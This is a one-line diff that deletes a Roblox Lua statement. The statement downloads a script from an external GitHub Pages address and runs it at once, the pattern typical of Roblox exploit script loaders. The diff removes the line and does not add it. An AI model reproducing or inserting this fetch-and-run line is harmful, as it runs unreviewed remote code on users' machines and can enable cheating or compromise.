@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://kekn9ne.github.io/loader.lua"))()
